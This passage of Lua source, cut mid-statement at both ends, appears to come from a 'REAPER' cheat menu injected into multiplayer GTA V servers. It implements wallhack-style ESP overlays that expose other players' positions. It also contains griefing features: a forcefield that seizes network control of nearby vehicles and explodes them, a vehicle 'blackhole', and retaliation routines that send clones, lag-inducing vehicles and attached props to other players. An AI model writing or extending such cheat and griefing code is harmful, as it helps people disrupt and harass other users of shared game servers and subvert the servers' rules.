                            if __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 3 and (not __REAPER1__.A['visuals:boxesp_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:boxesp_fself'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:boxesp_fself'].func) and (not __REAPER1__.A['visuals:boxesp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_fdistance'].sindex) and (not __REAPER1__.A['visuals:boxesp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.BoxEspFill(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 3 and (not __REAPER1__.A['visuals:baresp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:baresp_self'].func) and (not __REAPER1__.A['visuals:baresp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_distance'].sindex) and (not __REAPER1__.A['visuals:baresp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.HealthBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end
                            
                            if __REAPER1__.A['visuals:baresp_fbaresp'].func and __REAPER1__.A['visuals:baresp_ftarget'].sindex == 3 and (not __REAPER1__.A['visuals:baresp_fonlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:baresp_fself'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:baresp_fself'].func) and (not __REAPER1__.A['visuals:baresp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_fdistance'].sindex) and (not __REAPER1__.A['visuals:baresp_fonlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.ArmourBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 3 and (not __REAPER1__.A['visuals:markers_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:markers_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:markers_self'].func) and (not __REAPER1__.A['visuals:markers_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:markers_distance'].sindex) and (not __REAPER1__.A['visuals:markers_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.MarkerEsp(v, tcoords)
                            end

                            if __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 1 and (not __REAPER1__.A['visuals:blips_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:blips_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:blips_self'].func) and (not __REAPER1__.A['visuals:blips_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:blips_distance'].sindex) and __REAPER1__.T.VisBlips[v] == nil and (not __REAPER1__.A['visuals:blips_onlyalive'].func or __REAPER1__.A['visuals:blips_onlyalive'].func and __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.BlipEsp(v, tcoords)
                            end

                            if __REAPER1__.A['visuals:skeletonesp_skeletonesp'].func and __REAPER1__.A['visuals:skeletonesp_target'].sindex == 3 and (not __REAPER1__.A['visuals:skeletonesp_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) and (not __REAPER1__.A['visuals:skeletonesp_self'].func and v ~= __REAPER1__.V.SelfPed or __REAPER1__.A['visuals:skeletonesp_self'].func) and (not __REAPER1__.A['visuals:skeletonesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:skeletonesp_distance'].sindex) and (not __REAPER1__.A['visuals:skeletonesp_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.SkeletonEsp(v)
                            end
                        end

                        if __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 2 and (not __REAPER1__.A['visuals:fovarrow_onlyplayers'].func or __REAPER1__.N.IsPedAPlayer(v)) then
                            if __REAPER1__.A['visuals:fovarrow_occluded'].func then
                                local occl =  __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17)
                                if (not __REAPER1__.N.IsEntityOnScreen(v) or not occl) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                    __REAPER1__.F.FovArrows(tcoords, coords, occl)
                                end
                            elseif not __REAPER1__.N.IsEntityOnScreen(v) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.N.GetEntityHealth(v) > 100) then
                                __REAPER1__.F.FovArrows(tcoords, coords, v)
                            end
                        end

                        if __REAPER1__.A['server_anticlone'].func and not __REAPER1__.N.IsPedAPlayer(v) then
                            if __REAPER1__.N.GetEntityModel(v) == somodel then
                                local o1, o2, o3, o4, o5, o6 = __REAPER1__.N.CopyOutfit(v, true)
                                if so1 == o1 and so2 == o2 and so3 == o3 and so4 == o4 and so5 == o5 and so6 == o6 then
                                    local sender = __REAPER1__.N.NetworkGetEntityOwner(v)
                                    local senderPed = __REAPER1__.N.GetPlayerPed(sender)

                                    if senderPed ~= __REAPER1__.V.SelfPed then
                                        __REAPER1__.F.AddNotification('Tried to clone: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)

                                        if __REAPER1__.A['server_behav'].sindex == 1 then
                                            __REAPER1__.N.DeleteEntity(v)
                                        elseif __REAPER1__.A['server_behav'].sindex == 2 then
                                            __REAPER1__.N.ClonePed(senderPed, __REAPER1__.N.GetEntityHeading(senderPed), true, true)
                                            __REAPER1__.F.AddNotification('Sent clone to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                        elseif __REAPER1__.A['server_behav'].sindex == 3 then
                                            __REAPER1__.N.ClonePed(senderPed, __REAPER1__.N.GetEntityHeading(senderPed), true, true)
                                            __REAPER1__.N.DeleteEntity(v)
                                            __REAPER1__.F.AddNotification('Sent clone to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['player:forcefield_forcefield'].func and __REAPER1__.A['player:forcefield_vehicle'].func or
                __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 4 or
                __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 4 or
                __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 4 or
                __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 4 or
                __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 4 or
                __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 4 or
                __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 4 or
                __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 4 or
                __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 2 or
                __REAPER1__.A['world:blackmagic_blackhole'].func and __REAPER1__.A['world:blackmagic_vehicles'].func or
                __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 3 or 
                __REAPER1__.A['server_antiveh'].toggle then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = nil, nil, nil, nil, nil, nil, nil, nil
                    local sx, sy, w, y, w2, y2 = nil, nil, nil, nil, nil, nil
                    for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                        local tcoords = __REAPER1__.N.GetEntityCoords(v)

                        if __REAPER1__.A['player:forcefield_forcefield'].func and __REAPER1__.A['player:forcefield_vehicle'].func then
                            if v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, false) and #(coords - tcoords) <= __REAPER1__.A['player:forcefield_range'].sindex * 1.2 then
                                __REAPER25__(function()
                                    if __REAPER1__.F.NetControl(v) then
                                        if __REAPER1__.A['player:forcefield_type'].sindex == 2 then
                                            __REAPER1__.F.ApplyShockwave(v, coords, tcoords)
                                        end

                                        if __REAPER1__.A['player:forcefield_explode'].toggle then
                                            __REAPER1__.N.CreateExplosion(tcoords, __REAPER1__.A['player:forcefield_explode'].sindex - 1, 1000.0, true, true, 0)
                                        end
                                    end
                                    __REAPER26__(0)
                                end)
                            end
                        end

                        if __REAPER1__.A['world:blackmagic_blackhole'].func and __REAPER1__.A['world:blackmagic_vehicles'].func and __REAPER1__.V.BlackholePos then
                            __REAPER25__(function()
                                if __REAPER1__.F.NetControl(v) then
                                    local pos1 = (__REAPER1__.V.BlackholePos - tcoords) * (__REAPER1__.A['world:blackmagic_strength'].sindex / 30)
                                    local pos2 = __REAPER1__.N.GetEntityVelocity(v) * (2.0 * (__REAPER1__.A['world:blackmagic_strength'].sindex / 100) * 0.3) + vector3(0.0, 0.0, 0.1)
                                    __REAPER1__.N.ApplyForceToEntity(v, 3, pos1 - pos2, 0, 0, 0, false, false, true, true, false, true)
                                end
                            end)
                        end

                        if __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 4 and (__REAPER1__.A['visuals:lineesp_distance'].toggle and #(coords - tcoords) <= __REAPER1__.A['visuals:lineesp_distance'].sindex or not __REAPER1__.A['visuals:lineesp_distance'].toggle) then
                            __REAPER1__.F.LineEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.N.IsEntityOnScreen(v) then
                            local boundingcheck = __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 4 or __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 4
                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 4 or __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 4 or __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 4 then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v, boundingcheck and 'cock' or 'min')
                                sx, sy, w, y, w2, y2 = __REAPER1__.F.Entity2dDimensions(tcoords, tfr, bbl, tfl, bbr)
                            elseif boundingcheck then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v)
                            end

                            if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 4 and (__REAPER1__.A['visuals_self'].func or v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed)) and (not __REAPER1__.A['visuals_onlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) and (not __REAPER1__.A['visuals_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_distance'].sindex) then
                                __REAPER1__.F.BoundingBox(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 4 and (__REAPER1__.A['visuals_fself'].func or v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed)) and (not __REAPER1__.A['visuals_fonlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) and (not __REAPER1__.A['visuals_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_fdistance'].sindex) then
                                __REAPER1__.F.BoundingBoxFill(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 4 and (not __REAPER1__.A['visuals:textesp_self'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:textesp_self'].func) and (not __REAPER1__.A['visuals:textesp_distance'].toggle and #(coords - tcoords) <= __REAPER1__.A['visuals:textesp_distance'].sindex) and (not __REAPER1__.A['visuals:textesp_onlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.DrawTextEsp(v, coords, tcoords)
                            end
            
                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 4 and (not __REAPER1__.A['visuals:boxesp_self'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:boxesp_self'].func) and (not __REAPER1__.A['visuals:boxesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_distance'].sindex) and (not __REAPER1__.A['visuals:boxesp_onlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.BoxEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 4 and (not __REAPER1__.A['visuals:boxesp_fself'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:boxesp_fself'].func) and (not __REAPER1__.A['visuals:boxesp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_fdistance'].sindex) and (not __REAPER1__.A['visuals:boxesp_fonlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.BoxEspFill(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_target'].sindex == 4 and (not __REAPER1__.A['visuals:baresp_fself'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:baresp_fself'].func) and (not __REAPER1__.A['visuals:baresp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:baresp_distance'].sindex) and (not __REAPER1__.A['visuals:baresp_onlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.HealthBarEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 4 and (not __REAPER1__.A['visuals:markers_self'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:markers_self'].func) and (not __REAPER1__.A['visuals:markers_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:markers_distance'].sindex) and (not __REAPER1__.A['visuals:markers_onlyalive'].func or __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.MarkerEsp(v, tcoords)
                            end

                            if __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 2 and (not __REAPER1__.A['visuals:blips_self'].func and v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) or __REAPER1__.A['visuals:blips_self'].func) and (not __REAPER1__.A['visuals:blips_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:blips_distance'].sindex) and __REAPER1__.T.VisBlips[v] == nil and (not __REAPER1__.A['visuals:blips_onlyalive'].func or __REAPER1__.A['visuals:blips_onlyalive'].func and __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.BlipEsp(v, tcoords)
                            end
                        end

                        if __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 3 then
                            if __REAPER1__.A['visuals:fovarrow_occluded'].func then
                                local occl =  __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17)
                                if (not __REAPER1__.N.IsEntityOnScreen(v) or not occl) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.A['visuals:fovarrow_onlyalive'].func and __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                    __REAPER1__.F.FovArrows(tcoords, coords, occl)
                                end
                            elseif not __REAPER1__.N.IsEntityOnScreen(v) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) and (not __REAPER1__.A['visuals:fovarrow_onlyalive'].func or __REAPER1__.A['visuals:fovarrow_onlyalive'].func and __REAPER1__.N.IsVehicleDriveable(v, true)) then
                                __REAPER1__.F.FovArrows(tcoords, coords, v)
                            end
                        end

                        if __REAPER1__.A['server_antiveh'].toggle then
                            if #(coords - __REAPER1__.N.GetEntityCoords(v)) <= __REAPER1__.A['server_antiveh'].sindex then
                                for _k,_v in ipairs(__REAPER1__.T.BlackListedModels) do
                                    if __REAPER1__.N.GetEntityModel(v) == _v then
                                        local sender = __REAPER1__.N.NetworkGetEntityOwner(v)
                                        local senderPed = __REAPER1__.N.GetPlayerPed(sender)

                                        if sender ~= -1 and senderPed ~= __REAPER1__.V.SelfPed then
                                            __REAPER1__.F.AddNotification('Tried to vehicle lag: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)

                                            if __REAPER1__.A['server_behav'].sindex == 1 then
                                                __REAPER1__.N.DeleteEntity(v)
                                            elseif __REAPER1__.A['server_behav'].sindex == 2 then
                                                __REAPER1__.N.CreateVehicle(_v, __REAPER1__.N.GetEntityCoords(senderPed), __REAPER1__.N.GetEntityHeading(senderPed), true, true)
                                                __REAPER1__.F.AddNotification('Sent vehicle lag to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                            elseif __REAPER1__.A['server_behav'].sindex == 3 then
                                                __REAPER1__.N.CreateVehicle(_v, __REAPER1__.N.GetEntityCoords(senderPed), __REAPER1__.N.GetEntityHeading(senderPed), true, true)
                                                __REAPER1__.N.DeleteEntity(v)
                                                __REAPER1__.F.AddNotification('Sent vehicle lag to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 5 or
                __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 5 or
                __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 5 or
                __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 5 or
                __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 5 or
                __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 5 or
                __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 5 or
                __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 3 or
                __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 4 or
                __REAPER1__.A['server_antiattach'].func then
                    local coords = __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.V.FreecamC or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = nil, nil, nil, nil, nil, nil, nil, nil
                    local sx, sy, w, y, w2, y2 = nil, nil, nil, nil, nil, nil

                    for k,v in pairs(__REAPER1__.N.GameTable('CObject')) do
                        local tcoords = __REAPER1__.N.GetEntityCoords(v)

                        if __REAPER1__.A['visuals:lineesp_lineesp'].func and __REAPER1__.A['visuals:lineesp_target'].sindex == 5 and (not __REAPER1__.A['visuals:lineesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:lineesp_distance'].sindex) then
                            __REAPER1__.F.LineEsp(v, coords, tcoords)
                        end

                        if __REAPER1__.N.IsEntityOnScreen(v) then
                            local boundingcheck = __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 5 or __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 5
                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 5 or __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 5  then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v, boundingcheck and 'cock' or 'min')
                                sx, sy, w, y, w2, y2 = __REAPER1__.F.Entity2dDimensions(tcoords, tfr, bbl, tfl, bbr)
                            elseif boundingcheck then
                                tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl = __REAPER1__.F.EntityDimensions(v)
                            end

                            if __REAPER1__.A['visuals_boundingbox'].func and __REAPER1__.A['visuals_target'].sindex == 5 and (not __REAPER1__.A['visuals_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_distance'].sindex) then
                                __REAPER1__.F.BoundingBox(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals_boxfilling'].func and __REAPER1__.A['visuals_ftarget'].sindex == 5 and (not __REAPER1__.A['visuals_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals_fdistance'].sindex) then
                                __REAPER1__.F.BoundingBoxFill(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
                            end

                            if __REAPER1__.A['visuals:textesp_textesp'].func and __REAPER1__.A['visuals:textesp_target'].sindex == 5 and (not __REAPER1__.A['visuals:textesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:textesp_distance'].sindex) then
                                __REAPER1__.F.DrawTextEsp(v, coords, tcoords)
                            end

                            if __REAPER1__.A['visuals:boxesp_boxesp'].func and __REAPER1__.A['visuals:boxesp_target'].sindex == 5 and (not __REAPER1__.A['visuals:boxesp_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_distance'].sindex) then
                                __REAPER1__.F.BoxEsp(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:boxesp_fboxesp'].func and __REAPER1__.A['visuals:boxesp_ftarget'].sindex == 5 and (not __REAPER1__.A['visuals:boxesp_fdistance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:boxesp_fdistance'].sindex) then
                                __REAPER1__.F.BoxEspFill(v, tcoords, sx, sy, w, y, w2, y2)
                            end

                            if __REAPER1__.A['visuals:markers_markers'].func and __REAPER1__.A['visuals:markers_target'].sindex == 5 and (not __REAPER1__.A['visuals:markers_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:markers_distance'].sindex) then
                                __REAPER1__.F.MarkerEsp(v, tcoords)
                            end

                            if __REAPER1__.A['visuals:blips_blips'].func and __REAPER1__.A['visuals:blips_target'].sindex == 3 and (not __REAPER1__.A['visuals:blips_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:blips_distance'].sindex) and __REAPER1__.T.VisBlips[v] == nil then
                                __REAPER1__.F.BlipEsp(v, tcoords)
                            end
                        end

                        if __REAPER1__.A['visuals:fovarrow_fovarrow'].func and __REAPER1__.A['visuals:fovarrow_target'].sindex == 4 then
                            if __REAPER1__.A['visuals:fovarrow_occluded'].func then
                                local occl =  __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17)
                                if (not __REAPER1__.N.IsEntityOnScreen(v) or not occl) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) then
                                    __REAPER1__.F.FovArrows(tcoords, coords, occl)
                                end
                            elseif not __REAPER1__.N.IsEntityOnScreen(v) and (not __REAPER1__.A['visuals:fovarrow_distance'].toggle or #(coords - tcoords) <= __REAPER1__.A['visuals:fovarrow_distance'].sindex) then
                                __REAPER1__.F.FovArrows(tcoords, coords, v)
                            end
                        end

                        if __REAPER1__.A['server_antiattach'].func and __REAPER1__.N.IsEntityAttachedToEntity(v, __REAPER1__.V.SelfPed) then
                            local sender = __REAPER1__.N.NetworkGetEntityOwner(v)
                            local senderPed = __REAPER1__.N.GetPlayerPed(sender)

                            if senderPed ~= __REAPER1__.V.SelfPed then
                                __REAPER1__.F.AddNotification('Tried to attach: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)

                                if __REAPER1__.A['server_behav'].sindex == 1 then
                                    __REAPER1__.N.DeleteEntity(v)
                                elseif __REAPER1__.A['server_behav'].sindex == 2 then
                                    __REAPER1__.N.CreateObject(__REAPER1__.N.GetHashKey(v), __REAPER1__.N.GetEntityCoords(senderPed), true, true)
                                    __REAPER1__.F.AddNotification('Attached prop to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                elseif __REAPER1__.A['server_behav'].sindex == 3 then
                                    __REAPER1__.N.CreateObject(__REAPER1__.N.GetHashKey(v), __REAPER1__.N.GetEntityCoords(senderPed), true, true)
                                    __REAPER1__.N.DeleteEntity(v)
                                    __REAPER1__.F.AddNotification('Attached prop to: ' .. __REAPER1__.N.GetPlayerName(sender), 10000, 255, 0, 0)
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['visuals:blips_blips'].func then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    for k,v in pairs(__REAPER1__.T.VisBlips) do
                        if __REAPER1__.N.DoesEntityExist(k) and (__REAPER1__.A['visuals:blips_occluded'].func or not __REAPER1__.A['visuals:blips_occluded'].func and __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, k, 17)) then
                            local c = __REAPER1__.N.GetEntityCoords(k)
                            if (__REAPER1__.A['visuals:blips_distance'].toggle and #(coords - c) <= __REAPER1__.A['visuals:blips_distance'].sindex or not __REAPER1__.A['visuals:blips_distance'].toggle) then      
                                if __REAPER1__.A['visuals:blips_ocolor'].toggle then
                                    if __REAPER1__.N.GetBlipColour(v) ~= __REAPER1__.A['visuals:blips_ocolor'].sindex - 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, k, 17) then
                                        __REAPER1__.N.SetBlipColour(v, __REAPER1__.A['visuals:blips_ocolor'].sindex - 1)
                                    elseif __REAPER1__.N.GetBlipColour(v) == __REAPER1__.A['visuals:blips_ocolor'].sindex - 1 and __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, k, 17) then
                                        __REAPER1__.N.SetBlipColour(v, __REAPER1__.A['visuals:blips_color'].sindex - 1)
                                    end
                                end
                                
                                __REAPER1__.N.BeginTextCommandSetBlipName('STRING')
                                __REAPER1__.N.AddTextComponentSubstringPlayerName(__REAPER1__.N.IsPedAPlayer(k) and __REAPER1__.N.GetPlayerName(__REAPER1__.N.NetworkGetPlayerIndexFromPed(k)) or k)
                                __REAPER1__.N.EndTextCommandSetBlipName(v)
                                __REAPER1__.N.SetBlipCoords(v, c)
                                __REAPER1__.N.SetBlipRotation(v, math.ceil(__REAPER1__.N.GetEntityRotation(k)[3]))
                            else
                                __REAPER1__.N.RemoveBlip(v)
                                __REAPER1__.T.VisBlips[k] = nil
                            end
                        else
                            __REAPER1__.N.RemoveBlip(v)
                            __REAPER1__.T.VisBlips[k] = nil
                        end
                    end
                end

                if __REAPER1__.A['weapon:modifier_forcegun'].func or __REAPER1__.A['weapon:ammo_driveitgun'].func or __REAPER1__.A['weapon:ammo_deletegun'].func or __REAPER1__.A['weapon:ammo_paintgun'].func or __REAPER1__.A['weapon:ammo_revivegun'].func or __REAPER1__.A['weapon:ammo_destroygun'].func or
                __REAPER1__.A['weapon:ammo_shrinkgun'].func or __REAPER1__.A['weapon:ammo_nocollisiongun'].func or __REAPER1__.A['weapon:ammo_nogravitygun'].func or __REAPER1__.A['weapon:ammo_freezegun'].func or __REAPER1__.A['weapon:ammo_fixgun'].func or __REAPER1__.A['weapon:ammo_mindcleargun'].func then
                    local ret2, coords2 = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret2 then
                        local coords, v = __REAPER1__.M.RayCastGameplayCamera(400.0)
                        if ret2 and v then
                            if __REAPER1__.A['weapon:modifier_forcegun'].func and __REAPER1__.A['weapon:modifier_pedestrians'].func and __REAPER1__.N.IsEntityAPed(v) or 
